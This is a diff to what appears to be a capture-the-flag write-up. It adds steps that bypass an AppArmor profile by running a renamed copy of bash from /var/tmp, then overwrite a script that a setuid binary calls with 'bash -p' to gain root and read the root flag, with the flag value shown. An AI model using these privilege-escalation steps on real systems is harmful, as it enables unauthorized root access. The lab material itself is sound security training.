@@ -567,7 +567,21 @@ think@ip-10-10-22-110:/etc/apparmor.d$ cat usr.sbin.ash
   owner /home/** rix,
 }
 ```
-cant read /opt, try to use /var/tmp for our goal, we can start new bash session and be without this armor
+cant read /opt, try to use /var/tmp for our goal, we can start new bash session and we will be without this armor 
 ```shell
-
+cd /var/tmp/
+cp /bin/bash ./fake
+./fake
+```
+and after we can change our /opt/run_container.sh
+```shell
+think@ip-10-10-22-110:/opt$ echo "bash -p" > /opt/run_container.sh
+think@ip-10-10-22-110:/opt$ /usr/sbin/run_container
+bash-5.0# id 
+uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
+```
+and take a root flag
+```shell
+bash-5.0# cat /root/root.txt
+3a4225cc9e85709adda6ef55d6a4f2ca 
 ```
